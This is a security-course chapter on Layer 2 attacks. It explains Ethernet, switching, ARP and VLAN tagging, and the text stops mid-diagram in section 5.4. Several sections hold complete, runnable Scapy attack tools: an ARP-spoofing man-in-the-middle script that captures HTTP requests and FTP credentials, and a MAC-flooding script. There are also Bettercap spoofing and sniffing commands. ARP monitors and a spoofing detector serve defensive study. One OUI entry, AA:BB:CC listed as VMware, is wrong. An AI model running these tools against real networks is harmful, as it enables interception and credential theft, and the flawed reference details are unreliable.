# Link Layer Attacks: The Local LAN War

---
title: "Link Layer Attacks"
parent: "[[02_Networking]]"
tags:
  - network
  - layer-2
  - arp
  - vlan
  - attacks
  - mitm
created: 2026-01-23
updated: 2026-01-24
---

> **Executive Summary**: The Data Link Layer (Layer 2) is the "Wild West" of networking. Designed in an era of implicit trust, protocols like Ethernet and ARP have almost no built-in security authentication. If an attacker gains physical access to a network port or compromises a single host on the LAN, they can manipulate the physical addressing scheme to intercept, modify, or stop traffic for the entire subnet. This chapter covers the mechanics of L2 fundamentals and the attacks that exploit them.

---

## Table of Contents
1. [Learning Objectives](#1-learning-objectives)
2. [L2 Fundamentals: Ethernet & Switching](#2-l2-fundamentals-ethernet--switching)
3. [The Address Resolution Protocol (ARP)](#3-the-address-resolution-protocol-arp)
4. [ARP Spoofing: The Classic MitM](#4-arp-spoofing-the-classic-mitm)
5. [Switch Attacks: MAC Flooding & VLAN Hopping](#5-switch-attacks-mac-flooding--vlan-hopping)
6. [Other L2 Attacks (STP & DHCP)](#6-other-l2-attacks-stp--dhcp)
7. [Defense: Hardening the Switch](#7-defense-hardening-the-switch)
8. [Practical Lab: The Man-in-the-Middle](#8-practical-lab-the-man-in-the-middle)
9. [Advanced Attack Scenarios](#9-advanced-attack-scenarios)
10. [MAC Address Manipulation](#10-mac-address-manipulation)
11. [VLAN Security Deep Dive](#11-vlan-security-deep-dive)
12. [802.1X Authentication Attacks](#12-8021x-authentication-attacks)
13. [Switch Exploitation Techniques](#13-switch-exploitation-techniques)
14. [Traffic Analysis and Sniffing](#14-traffic-analysis-and-sniffing)
15. [Critical Analysis & Checkpoints](#15-critical-analysis--checkpoints)

---

## 1. Learning Objectives

By the end of this chapter, you will be able to:

- **Dissect Frames**: Analyze Ethernet headers to understand MAC addressing and EtherTypes.
- **Master ARP Spoofing**: Execute and troubleshoot Man-in-the-Middle (MitM) attacks using tools like `bettercap` and `arpspoof`.
- **Break Switches**: Explain how **MAC Flooding** forces switches to behave like hubs.
- **Escape VLANs**: Describe Switch Spoofing and Double Tagging attacks.
- **Defend the LAN**: Implement Port Security, DHCP Snooping, and Dynamic ARP Inspection (DAI).
- **Exploit CDP/LLDP**: Extract network topology information from discovery protocols.
- **Bypass 802.1X**: Understand port-based authentication bypass techniques.
- **Craft Layer 2 Attacks**: Build custom tools for MAC flooding, ARP poisoning, and VLAN hopping.

---

## 2. L2 Fundamentals: Ethernet & Switching

### 2.1 The MAC Address

A Media Access Control (MAC) address is a 48-bit identifier (e.g., `00:11:22:33:44:55`).
- **OUI (Organizationally Unique Identifier)**: The first 24 bits (`00:11:22`) identify the manufacturer (Dell, Apple, Cisco). Hackers change this to blend in.
- **NIC Specific**: The last 24 bits are unique to the card.
- **Promiscuous Mode**: Normally, a NIC ignores frames not addressed to it. In Promiscuous Mode (used by Wireshark/Sniffers), it reads *everything* that reaches the wire.

### 2.2 MAC Address Format Breakdown

```
MAC Address: 00:1A:2B:3C:4D:5E

Byte 1-3 (OUI): 00:1A:2B
┌────────────────────────────────┐
│ Manufacturer Identifier        │
│ - 00:1A:2B = Example Vendor    │
│ - AA:BB:CC = VMware            │
│ - 00:0C:29 = VMware            │
│ - 08:00:27 = VirtualBox        │
│ - 52:54:00 = QEMU/KVM          │
└────────────────────────────────┘

Byte 4-6 (NIC): 3C:4D:5E
┌────────────────────────────────┐
│ Device-Specific Identifier     │
│ - Unique to this network card  │
└────────────────────────────────┘

Special Addresses:
- FF:FF:FF:FF:FF:FF = Broadcast (all devices)
- 01:00:5E:xx:xx:xx = IPv4 Multicast
- 33:33:xx:xx:xx:xx = IPv6 Multicast
- Bit 0 of Byte 1 = 1: Multicast
- Bit 1 of Byte 1 = 1: Locally Administered (spoofed/virtual)
```

### 2.3 The Switch CAM Table

Switches are intelligent. They learn.
1.  Packet enters Port 1 from MAC A.
2.  Switch records: "MAC A is on Port 1" in its **CAM (Content Addressable Memory)** Table.
3.  Packet destined for MAC B arrives.
4.  Switch checks CAM Table.
    -   **Known**: Sends only to Port where MAC B lives (Unicast).
    -   **Unknown**: Sends to **ALL** ports (Flood) except the source.

**The Attack Surface**: If we can confuse the switch about where a MAC lives, or overflow its memory, we can break isolation.

### 2.4 CAM Table Mechanics

```
Switch CAM Table Structure:
┌──────────────────┬──────────┬─────────────┬────────┐
│ MAC Address      │ Port     │ VLAN        │ Age    │
├──────────────────┼──────────┼─────────────┼────────┤
│ AA:BB:CC:DD:EE:01│ Gi0/1    │ VLAN 10     │ 120s   │
│ AA:BB:CC:DD:EE:02│ Gi0/2    │ VLAN 10     │ 45s    │
│ AA:BB:CC:DD:EE:03│ Gi0/1    │ VLAN 20     │ 300s   │
│ ...              │ ...      │ ...         │ ...    │
└──────────────────┴──────────┴─────────────┴────────┘

CAM Table Size:
- Small switches: 1,000 - 8,000 entries
- Enterprise: 16,000 - 128,000 entries
- Core switches: 256,000+ entries

Aging Process:
- Default timeout: 300 seconds (5 minutes)
- Entry refreshed when switch sees traffic from that MAC
- Expired entries removed to make room for new ones
```

### 2.5 Ethernet Frame Structure Deep Dive

```
Ethernet II Frame Format:
┌─────────────────────────────────────────────────────────┐
│ Preamble (7 bytes): 10101010... (synchronization)      │
│ SFD (1 byte): 10101011 (Start Frame Delimiter)         │
├─────────────────────────────────────────────────────────┤
│ Destination MAC (6 bytes): Who should receive this     │
│ Source MAC (6 bytes): Who sent this                    │
│ [Optional] 802.1Q VLAN Tag (4 bytes)                   │
│ EtherType (2 bytes): What protocol is inside           │
│   - 0x0800 = IPv4                                       │
│   - 0x0806 = ARP                                        │
│   - 0x86DD = IPv6                                       │
│   - 0x8100 = 802.1Q VLAN tag                           │
├─────────────────────────────────────────────────────────┤
│ Payload (46-1500 bytes)                                 │
│ - Minimum 46 bytes (padded if necessary)                │
│ - Maximum 1500 bytes (MTU)                              │
│ - Contains Layer 3 packet (IP, ARP, etc.)               │
├─────────────────────────────────────────────────────────┤
│ FCS - Frame Check Sequence (4 bytes)                   │
│ - CRC32 checksum for error detection                   │
│ - Calculated over DA, SA, Type/Length, and Data        │
└─────────────────────────────────────────────────────────┘

Total Frame Size:
- Minimum: 64 bytes (including FCS)
- Maximum: 1518 bytes (standard)
- Maximum with VLAN: 1522 bytes
- Jumbo frames: Up to 9000 bytes
```

### 2.6 Beginner's Explanation: How Switches Work

**For Beginners**: Think of a switch like an intelligent mail sorter:

**Hub (Old Technology)**:
- Like shouting in a crowded room
- Everyone hears everything
- No privacy
- Lots of collisions

**Switch (Modern)**:
- Like a smart postal service
- Learns where each person lives (MAC address)
- Delivers mail only to the right person
- Private conversations
- No collisions

**Example**:
```
Computer A wants to talk to Computer B

Step 1: Computer A sends frame
  [From: MAC-A] [To: MAC-B] [Data: "Hello"]

Step 2: Switch receives on Port 1
  - Records: "MAC-A lives on Port 1"
  - Checks: "Where is MAC-B?"

Step 3a: If MAC-B is known (in CAM table)
  - Sends frame ONLY to Port where MAC-B lives (e.g., Port 3)

Step 3b: If MAC-B is unknown
  - Floods frame to ALL ports except Port 1
  - When MAC-B responds, switch learns its location
```

---

## 3. The Address Resolution Protocol (ARP)

IPs are logical; MACs are physical. ARP maps them.

### 3.1 The ARP Cycle

1.  **Request**: "Who has 192.168.1.1?" (Broadcast: `FF:FF:FF:FF:FF:FF`).
2.  **Reply**: "I have 192.168.1.1, my MAC is AA:BB..." (Unicast).
3.  **Cache**: The OS stores this mapping for ~2-20 minutes (`arp -a`).

### 3.2 ARP Packet Structure

```
ARP Packet Format (28 bytes):
┌──────────────────────────────────────────────┐
│ Hardware Type (2 bytes): 0x0001 = Ethernet   │
│ Protocol Type (2 bytes): 0x0800 = IPv4       │
│ Hardware Size (1 byte): 6 (MAC length)       │
│ Protocol Size (1 byte): 4 (IPv4 length)      │
│ Opcode (2 bytes):                            │
│   - 1 = ARP Request                          │
│   - 2 = ARP Reply                            │
├──────────────────────────────────────────────┤
│ Sender MAC Address (6 bytes)                 │
│ Sender IP Address (4 bytes)                  │
│ Target MAC Address (6 bytes)                 │
│   - 00:00:00:00:00:00 in requests            │
│ Target IP Address (4 bytes)                  │
└──────────────────────────────────────────────┘
```

### 3.3 ARP Communication Example

```
Scenario: Computer A (192.168.1.100) wants to talk to Router (192.168.1.1)

Step 1: Check ARP Cache
  $ arp -a
  (empty or expired entry)

Step 2: Broadcast ARP Request
  Ethernet Frame:
    Dst MAC: FF:FF:FF:FF:FF:FF (broadcast)
    Src MAC: AA:BB:CC:DD:EE:01 (Computer A)
    Type: 0x0806 (ARP)
  
  ARP Payload:
    Opcode: 1 (Request)
    Sender MAC: AA:BB:CC:DD:EE:01
    Sender IP: 192.168.1.100
    Target MAC: 00:00:00:00:00:00 (unknown)
    Target IP: 192.168.1.1 (who we're looking for)
  
  [Computer A broadcasts to entire network]

Step 3: Router Receives Request
  - Router sees Target IP matches its own IP
  - Prepares ARP Reply

Step 4: Router Sends ARP Reply
  Ethernet Frame:
    Dst MAC: AA:BB:CC:DD:EE:01 (Computer A)
    Src MAC: 11:22:33:44:55:66 (Router)
    Type: 0x0806 (ARP)
  
  ARP Payload:
    Opcode: 2 (Reply)
    Sender MAC: 11:22:33:44:55:66
    Sender IP: 192.168.1.1
    Target MAC: AA:BB:CC:DD:EE:01
    Target IP: 192.168.1.100
  
  [Router sends unicast to Computer A]

Step 5: Computer A Updates Cache
  $ arp -a
  Interface: 192.168.1.100
    192.168.1.1          11-22-33-44-55-66     dynamic

Now Computer A can send IP packets to Router!
```

### 3.4 Gratuitous ARP (GARP)

An unrequested announcement. "Update your tables, I am 192.168.1.1 now." Used for Failover (HSRP/VRRP), but also abused by attackers.

**Legitimate Uses:**
- IP address conflict detection
- Announcing new MAC for same IP (failover)
- Updating switches/routers after NIC change

**Gratuitous ARP Packet:**
```
Opcode: 2 (Reply - even though no one asked)
Sender MAC: AA:BB:CC:DD:EE:FF (new MAC)
Sender IP: 192.168.1.100
Target MAC: FF:FF:FF:FF:FF:FF (broadcast)
Target IP: 192.168.1.100 (same as sender)
```

### 3.5 The Flaw

ARP is **stateless** and **unauthenticated**.
- A device will accept an ARP Reply even if it never sent an ARP Request.
- Any device can claim to be any IP.
- No verification of sender's identity.
- Cache entries can be overwritten at any time.

**Security Implications:**
```
Normal ARP:
  Router: "I am 192.168.1.1, MAC: AA:BB:CC"
  Computers: "OK, we'll send traffic to AA:BB:CC"

Malicious ARP:
  Attacker: "I am 192.168.1.1, MAC: 11:22:33"
  Computers: "OK, we'll send traffic to 11:22:33"
  [Traffic now goes to attacker instead of router!]
```

### 3.6 Code Example: ARP Cache Analysis

```python
#!/usr/bin/env python3
"""
ARP Cache Monitor
Monitors ARP cache for changes and suspicious activity
"""

import subprocess
import time
import re
from collections import defaultdict

class ARPCacheMonitor:
    def __init__(self):
        self.arp_cache = {}
        self.history = defaultdict(list)
    
    def get_arp_cache(self):
        """
        Get current ARP cache from system
        """
        cache = {}
        
        try:
            # Linux/Mac
            output = subprocess.check_output(['arp', '-an']).decode()
            
            # Parse output
            # Format: ? (192.168.1.1) at aa:bb:cc:dd:ee:ff [ether] on eth0
            pattern = r'\(([0-9.]+)\) at ([0-9a-f:]+)'
            
            for match in re.finditer(pattern, output):
                ip = match.group(1)
                mac = match.group(2)
                cache[ip] = mac.upper()
        
        except Exception as e:
            print(f"[-] Error reading ARP cache: {e}")
        
        return cache
    
    def detect_changes(self):
        """
        Detect ARP cache changes
        """
        current_cache = self.get_arp_cache()
        
        # Check for changes
        for ip, new_mac in current_cache.items():
            if ip in self.arp_cache:
                old_mac = self.arp_cache[ip]
                
                if old_mac != new_mac:
                    # MAC changed for this IP
                    self.history[ip].append({
                        'time': time.time(),
                        'old_mac': old_mac,
                        'new_mac': new_mac
                    })
                    
                    print(f"\n[!] ARP CHANGE DETECTED")
                    print(f"    IP: {ip}")
                    print(f"    Old MAC: {old_mac}")
                    print(f"    New MAC: {new_mac}")
                    print(f"    Time: {time.ctime()}")
                    
                    # Check if this is suspicious
                    if len(self.history[ip]) > 3:
                        print(f"    [!] WARNING: {len(self.history[ip])} changes detected for this IP!")
                        print(f"    [!] Possible ARP poisoning attack!")
        
        # Check for new entries
        for ip in current_cache:
            if ip not in self.arp_cache:
                print(f"[*] New ARP entry: {ip} -> {current_cache[ip]}")
        
        # Check for removed entries
        for ip in self.arp_cache:
            if ip not in current_cache:
                print(f"[*] ARP entry expired: {ip} -> {self.arp_cache[ip]}")
        
        # Update cache
        self.arp_cache = current_cache
    
    def print_cache(self):
        """
        Print current ARP cache
        """
        print(f"\n{'='*60}")
        print("CURRENT ARP CACHE")
        print(f"{'='*60}")
        print(f"{'IP Address':<20} {'MAC Address':<20}")
        print(f"{'-'*60}")
        
        for ip, mac in sorted(self.arp_cache.items()):
            print(f"{ip:<20} {mac:<20}")
        
        print(f"{'-'*60}")
        print(f"Total Entries: {len(self.arp_cache)}")
    
    def monitor(self, interval=5):
        """
        Continuously monitor ARP cache
        """
        print(f"[*] Starting ARP Cache Monitor")
        print(f"[*] Check interval: {interval} seconds")
        print(f"[*] Press Ctrl+C to stop\n")
        
        # Initial cache
        self.arp_cache = self.get_arp_cache()
        self.print_cache()
        
        try:
            while True:
                time.sleep(interval)
                self.detect_changes()
        
        except KeyboardInterrupt:
            print("\n[*] Monitoring stopped")
            
            # Print statistics
            if self.history:
                print(f"\n{'='*60}")
                print("ARP CHANGE HISTORY")
                print(f"{'='*60}")
                
                for ip, changes in self.history.items():
                    print(f"\nIP: {ip}")
                    for change in changes:
                        print(f"  {time.ctime(change['time'])}")
                        print(f"    {change['old_mac']} -> {change['new_mac']}")

# Example usage
if __name__ == "__main__":
    monitor = ARPCacheMonitor()
    interval = int(input("[?] Check interval in seconds (default: 5): ") or "5")
    monitor.monitor(interval)
```

---

## 4. ARP Spoofing: The Classic MitM

### 4.1 The Mechanism

The attacker convinces the **Victim** that the Attacker is the **Router**.
The attacker convinces the **Router** that the Attacker is the **Victim**.

**Result**: All traffic flows: Victim -> Attacker -> Router.
- The attacker can read cleartext (HTTP, Telnet, FTP).
- The attacker can modify traffic (DNS Spoofing, Code Injection).
- The attacker can drop traffic (Denial of Service).

### 4.2 ARP Spoofing Visual Diagram

```
BEFORE ATTACK (Normal Communication):
┌─────────────┐                           ┌─────────────┐
│   Victim    │                           │   Router    │
│ 192.168.1.10│ ←→ Direct Communication ←→│ 192.168.1.1 │
│ MAC: AA:BB  │                           │ MAC: 11:22  │
└─────────────┘                           └─────────────┘

Victim's ARP Cache:
  192.168.1.1 -> 11:22 (Router's real MAC)

Router's ARP Cache:
  192.168.1.10 -> AA:BB (Victim's real MAC)

═══════════════════════════════════════════════════════════

DURING ATTACK (ARP Poisoned):
                    ┌─────────────┐
                    │  Attacker   │
                    │192.168.1.50 │
                    │ MAC: FF:EE  │
                    └──────┬──────┘
                           │
            Poisoned ARP   │   Poisoned ARP
                 ↓         │         ↓
        ┌─────────────┐    │    ┌─────────────┐
        │   Victim    │    │    │   Router    │
        │ 192.168.1.10│    │    │ 192.168.1.1 │
        │ MAC: AA:BB  │    │    │ MAC: 11:22  │
        └─────────────┘    │    └─────────────┘
                           │
                All Traffic Flows Through Attacker

Victim's ARP Cache (POISONED):
  192.168.1.1 -> FF:EE (Attacker's MAC, claiming to be Router!)

Router's ARP Cache (POISONED):
  192.168.1.10 -> FF:EE (Attacker's MAC, claiming to be Victim!)

Result:
  Victim sends to Router → Goes to Attacker → Attacker forwards to Router
  Router replies to Victim → Goes to Attacker → Attacker forwards to Victim
```

### 4.3 Forwarding is Critical

If you spoof ARP but don't forward packets, the victim loses internet access (DoS).
**Linux Command**:
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

### 4.4 Complete ARP Spoofing Implementation

```python
#!/usr/bin/env python3
"""
Advanced ARP Spoofing Tool
Full-featured MitM attack implementation
"""

from scapy.all import *
import time
import sys
import os
import threading
import argparse

class ARPSpoofer:
    def __init__(self, target_ip, gateway_ip, interface):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.target_mac = None
        self.gateway_mac = None
        self.running = False
        self.packet_count = 0
        self.intercepted_packets = []
    
    def get_mac(self, ip):
        """
        Get MAC address for IP using ARP
        """
        print(f"[*] Resolving MAC for {ip}...")
        
        # Send ARP request
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        
        # Get response
        answered_list = srp(arp_request_broadcast, timeout=3, verbose=False)[0]
        
        if answered_list:
            return answered_list[0][1].hwsrc
        else:
            return None
    
    def spoof(self, target_ip, spoof_ip, target_mac):
        """
        Send spoofed ARP packet
        """
        # Create ARP reply
        packet = ARP(op=2,  # ARP Reply
                    pdst=target_ip,  # Target IP
                    hwdst=target_mac,  # Target MAC
                    psrc=spoof_ip)  # Claim to be this IP
        
        # Send packet
        send(packet, verbose=False)
    
    def restore(self, dest_ip, source_ip, dest_mac, source_mac):
        """
        Restore ARP tables to normal
        """
        packet = ARP(op=2,
                    pdst=dest_ip,
                    hwdst=dest_mac,
                    psrc=source_ip,
                    hwsrc=source_mac)
        
        send(packet, count=5, verbose=False)
    
    def poison_thread(self):
        """
        Continuously send poisoned ARP packets
        """
        print(f"[*] Starting ARP poisoning...")
        
        while self.running:
            # Poison victim (tell victim we are gateway)
            self.spoof(self.target_ip, self.gateway_ip, self.target_mac)
            
            # Poison gateway (tell gateway we are victim)
            self.spoof(self.gateway_ip, self.target_ip, self.gateway_mac)
            
            self.packet_count += 2
            
            time.sleep(2)
    
    def packet_callback(self, packet):
        """
        Process intercepted packets
        """
        if IP in packet:
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            
            # Only process packets involving target
            if src_ip == self.target_ip or dst_ip == self.target_ip:
                self.intercepted_packets.append(packet)
                
                # Extract interesting data
                if packet.haslayer(Raw):
                    load = packet[Raw].load
                    
                    # HTTP
                    if packet.haslayer(TCP) and packet[TCP].dport == 80:
                        if b"GET" in load or b"POST" in load:
                            print(f"\n[+] HTTP Request from {src_ip}:")
                            print(load[:200].decode(errors='ignore'))
                    
                    # FTP
                    elif packet.haslayer(TCP) and packet[TCP].dport == 21:
                        if b"USER" in load or b"PASS" in load:
                            print(f"\n[!] FTP Credentials:")
                            print(load.decode(errors='ignore'))
                    
                    # DNS
                    elif packet.haslayer(UDP) and packet[UDP].dport == 53:
                        if packet.haslayer(DNS) and packet[DNS].qr == 0:
                            query = packet[DNS].qd.qname.decode()
                            print(f"[*] DNS Query from {src_ip}: {query}")
    
    def sniff_thread(self):
        """
        Sniff intercepted traffic
        """
        print(f"[*] Starting packet capture...")
        
        # Sniff traffic
        sniff(iface=self.interface, 
              prn=self.packet_callback, 
              store=False,
              stop_filter=lambda x: not self.running)
    
    def start(self):
        """
        Start ARP spoofing attack
        """
        print(f"""
╔══════════════════════════════════════════════════════════╗
║            ARP SPOOFING ATTACK                           ║
╚══════════════════════════════════════════════════════════╝

Target IP:     {self.target_ip}
Gateway IP:    {self.gateway_ip}
Interface:     {self.interface}
        """)
        
        # Resolve MAC addresses
        self.target_mac = self.get_mac(self.target_ip)
        self.gateway_mac = self.get_mac(self.gateway_ip)
        
        if not self.target_mac:
            print(f"[-] Could not resolve target MAC for {self.target_ip}")
            return
        
        if not self.gateway_mac:
            print(f"[-] Could not resolve gateway MAC for {self.gateway_ip}")
            return
        
        print(f"[+] Target MAC:  {self.target_mac}")
        print(f"[+] Gateway MAC: {self.gateway_mac}")
        
        # Enable IP forwarding
        print(f"\n[*] Enabling IP forwarding...")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")
        
        # Start attack threads
        self.running = True
        
        poison_t = threading.Thread(target=self.poison_thread)
        poison_t.daemon = True
        poison_t.start()
        
        sniff_t = threading.Thread(target=self.sniff_thread)
        sniff_t.daemon = True
        sniff_t.start()
        
        print(f"\n[+] Attack started! Press Ctrl+C to stop")
        print(f"[*] Intercepting traffic...\n")
        
        try:
            while True:
                time.sleep(1)
                print(f"\r[*] Poisoned ARP packets sent: {self.packet_count} | Intercepted: {len(self.intercepted_packets)}", end="")
        
        except KeyboardInterrupt:
            print(f"\n\n[*] Stopping attack...")
            self.stop()
    
    def stop(self):
        """
        Stop attack and restore network
        """
        self.running = False
        time.sleep(3)
        
        print(f"[*] Restoring ARP tables...")
        self.restore(self.target_ip, self.gateway_ip, 
                    self.target_mac, self.gateway_mac)
        self.restore(self.gateway_ip, self.target_ip, 
                    self.gateway_mac, self.target_mac)
        
        print(f"[*] Disabling IP forwarding...")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")
        
        print(f"\n[+] Attack stopped and network restored")
        print(f"[*] Total packets intercepted: {len(self.intercepted_packets)}")

# CLI
if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] This script requires root privileges")
        sys.exit(1)
    
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP address")
    parser.add_argument("-i", "--interface", default="eth0", help="Network interface")
    
    args = parser.parse_args()
    
    spoofer = ARPSpoofer(args.target, args.gateway, args.interface)
    spoofer.start()
```

### 4.5 Using Bettercap for ARP Spoofing

```bash
# Install Bettercap
sudo apt install bettercap

# Start Bettercap
sudo bettercap -iface eth0

# Bettercap commands:
> net.probe on                    # Discover hosts
> net.show                        # Show discovered hosts
> set arp.spoof.targets 192.168.1.10   # Set target
> set arp.spoof.fullduplex true   # Spoof both directions
> arp.spoof on                    # Start spoofing
> net.sniff on                    # Start sniffing
> set net.sniff.filter 'port 80 or port 21 or port 23'  # Filter
> set net.sniff.verbose true     # Show details
```

### 4.6 ARP Spoofing Detection

```python
#!/usr/bin/env python3
"""
ARP Spoofing Detector
Monitors for ARP poisoning attacks
"""

from scapy.all import *
from collections import defaultdict
import time

class ARPSpoofDetector:
    def __init__(self):
        self.arp_table = {}  # {ip: (mac, timestamp)}
        self.alerts = []
        self.trusted_pairs = {}  # Load from file
    
    def load_trusted(self, filename="trusted_arp.txt"):
        """
        Load known-good IP-MAC pairs
        """
        try:
            with open(filename, 'r') as f:
                for line in f:
                    if line.strip() and not line.startswith('#'):
                        ip, mac = line.strip().split(',')
                        self.trusted_pairs[ip] = mac.upper()
            
            print(f"[+] Loaded {len(self.trusted_pairs)} trusted pairs")
        except FileNotFoundError:
            print(f"[*] No trusted pairs file found")
    
    def process_arp(self, packet):
        """
        Process ARP packet for anomalies
        """
        if ARP in packet and packet[ARP].op == 2:  # ARP Reply
            ip = packet[ARP].psrc
            mac = packet[ARP].hwsrc.upper()
            
            # Check against trusted pairs
            if ip in self.trusted_pairs:
                if mac != self.trusted_pairs[ip]:
                    self.create_alert("TRUSTED_VIOLATION", ip, mac, 
                                    self.trusted_pairs[ip])
                    return
            
            # Check for rapid changes
            if ip in self.arp_table:
                old_mac, old_time = self.arp_table[ip]
                
                if mac != old_mac:
                    time_diff = time.time() - old_time
                    
                    # Suspicious if changed within 60 seconds
                    if time_diff < 60:
                        self.create_alert("RAPID_CHANGE", ip, mac, old_mac)
                    else:
                        print(f"[*] MAC changed for {ip}: {old_mac} -> {mac} (after {time_diff:.0f}s)")
            
            # Update table
            self.arp_table[ip] = (mac, time.time())
    
    def create_alert(self, alert_type, ip, new_mac, old_mac):
        """
        Create security alert
        """
        alert = {
            'timestamp': time.time(),
            'type': alert_type,
            'ip': ip,
            'old_mac': old_mac,
            'new_mac': new_mac
        }
        
        self.alerts.append(alert)
        
        print(f"\n{'='*60}")
        print(f"[!] ALERT: {alert_type}")
        print(f"{'='*60}")
        print(f"Time:        {time.ctime()}")
        print(f"IP Address:  {ip}")
        print(f"Expected:    {old_mac}")
        print(f"Received:    {new_mac}")
        
        if alert_type == "TRUSTED_VIOLATION":
            print(f"\n[!] CRITICAL: Trusted device MAC changed!")
            print(f"[!] Possible ARP spoofing attack on critical infrastructure!")
        
        print(f"{'='*60}\n")
    
    def monitor(self, interface="eth0"):
        """
        Start monitoring
        """
        print(f"""
╔══════════════════════════════════════════════════════════╗
║        ARP SPOOFING DETECTOR                             ║
╚══════════════════════════════════════════════════════════╝

Interface: {interface}
Press Ctrl+C to stop

        """)
        
        self.load_trusted()
        
        try:
            sniff(iface=interface, filter="arp", prn=self.process_arp, store=False)
        except KeyboardInterrupt:
            print(f"\n[*] Stopped monitoring")
            print(f"[*] Total alerts: {len(self.alerts)}")

# Example usage
if __name__ == "__main__":
    detector = ARPSpoofDetector()
    interface = input("[?] Interface to monitor (default: eth0): ") or "eth0"
    detector.monitor(interface)
```

---

## 5. Switch Attacks: MAC Flooding & VLAN Hopping

### 5.1 MAC Flooding (CAM Table Overflow)

**Goal**: Turn the Switch into a Hub.
**Technique**: The attacker generates millions of fake Ethernet frames with random source MAC addresses using a tool like `macof`.
**Mechanism**:
1.  The switch adds every fake MAC to its CAM table.
2.  The CAM table memory fills up.
3.  **Fail-Open**: When the table is full, the switch cannot learn new MACs. To ensure traffic delivery, it defaults to **Flooding** all packets to all ports.
**Result**: The attacker can sniff traffic from other users on the same VLAN.

### 5.2 MAC Flooding Attack Implementation

```python
#!/usr/bin/env python3
"""
MAC Flooding Attack
Overflows switch CAM table to force hub mode
"""

from scapy.all import *
import random
import time

def random_mac():
    """
    Generate random MAC address
    """
    mac = [random.randint(0x00, 0xff) for _ in range(6)]
    return ':'.join(map(lambda x: "%02x" % x, mac))

def mac_flood(interface, count=10000, delay=0):
    """
    Flood switch with random MAC addresses
    
    Args:
        interface: Network interface to use
        count: Number of packets to send
        delay: Delay between packets (seconds)
    """
    print(f"""
╔══════════════════════════════════════════════════════════╗
║            MAC FLOODING ATTACK                           ║
╚══════════════════════════════════════════════════════════╝

Interface:  {interface}
Packets:    {count}
Delay:      {delay}s

[*] Starting attack...
    """)
    
    packet_count = 0
    start_time = time.time()
    
    try:
        for i in range(count):
            # Generate random source and destination MACs
            src_mac = random_mac()
            dst_mac = random_mac()
            
            # Create Ethernet frame with random MACs
            packet = Ether(src=src_mac, dst=dst_mac) / \
                    IP(src=f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
                       dst=f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}") / \
                    TCP(sport=random.randint(1024,65535), dport=random.randint(1,1024))
            
            # Send packet
            sendp(packet, iface=interface, verbose=False)
            
            packet_count += 1
            
            if packet_count % 100 == 0:
                elapsed = time.time() - start_time
                rate = packet_count / elapsed if elapsed > 0 else 0
                print(f"\r[*] Packets sent: {packet_count}/{count} | Rate: {rate:.0f} pkt/s", end="")
            
            if delay > 0:
                time.sleep(delay)
    
    except KeyboardInterrupt:
        print(f"\n[*] Attack stopped by user")
    
    elapsed = time.time() - start_time
    rate = packet_count / elapsed if elapsed > 0 else 0
    
    print(f"\n\n[+] Attack complete")
    print(f"[*] Total packets: {packet_count}")
    print(f"[*] Duration: {elapsed:.2f} seconds")
    print(f"[*] Average rate: {rate:.2f} packets/second")

def intelligent_flood(interface, duration=60):
    """
    More intelligent MAC flooding that varies attack pattern
    """
    print(f"[*] Starting intelligent MAC flood for {duration} seconds...")
    
    start_time = time.time()
    packet_count = 0
    
    try:
        while time.time() - start_time < duration:
            # Burst of packets
            burst_size = random.randint(10, 50)
            
            for _ in range(burst_size):
                src_mac = random_mac()
                dst_mac = random_mac()
                
                packet = Ether(src=src_mac, dst=dst_mac) / \
                        IP(src=f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
                           dst=f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}") / \
                        TCP()
                
                sendp(packet, iface=interface, verbose=False)
                packet_count += 1
            
            # Random pause between bursts
            time.sleep(random.uniform(0.1, 0.5))
            
            print(f"\r[*] Packets sent: {packet_count}", end="")
    
    except KeyboardInterrupt:
        print(f"\n[*] Attack stopped")
    
    print(f"\n[+] Total packets sent: {packet_count}")

# Example usage
if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] This script requires root privileges")
        sys.exit(1)
    
    print("""
1. Basic MAC flood
2. Intelligent MAC flood (burst pattern)
3. Exit
    """)
    
    choice = input("[?] Select option (1-3): ")
    
    if choice == "1":
        interface = input("[?] Interface (default: eth0): ") or "eth0"
        count = int(input("[?] Number of packets (default: 10000): ") or "10000")
        mac_flood(interface, count)
    
    elif choice == "2":
        interface = input("[?] Interface (default: eth0): ") or "eth0"
        duration = int(input("[?] Duration in seconds (default: 60): ") or "60")
        intelligent_flood(interface, duration)
```

### 5.3 VLAN Hopping

VLANs (Virtual LANs) logically separate departments (e.g., HR and Sales) on the same wire.

**Attack 1: Switch Spoofing**
- DTP (Dynamic Trunking Protocol) is often left enabled on user ports.
- An attacker configures their laptop to pretend to be a Switch (send DTP frames).
- They negotiate a "Trunk" link.
- **Result**: They can access ALL VLANs allowed on that trunk.

**Attack 2: Double Tagging**
- Relies on how switches process tags.
- Attacker sends a frame with TWO VLAN tags: `[Outer: Native VLAN] [Inner: Victim VLAN]`.
- Switch 1 strips the Native VLAN tag and forwards the packet.
- Switch 2 sees the Inner VLAN tag and forwards it to the victim.
- **Limitation**: One-way communication only (Blind injection).

### 5.4 VLAN Hopping Deep Dive

```
802.1Q VLAN Tagging:
┌─────────────────────────────────────────────────┐
│ Normal Ethernet Frame:                          │
│ [DA][SA][EtherType][Payload][FCS]              │
└─────────────────────────────────────────────────┘

802.1Q Tagged Frame:
┌─────────────────────────────────────────────────┐
│ [DA][SA][802.1Q Tag][EtherType][Payload][FCS]  │
│           │                                      │
│           └─> [TPID][PRI│CFI│VLAN ID]          │
│                0x8100 (2B) | (2B)               │
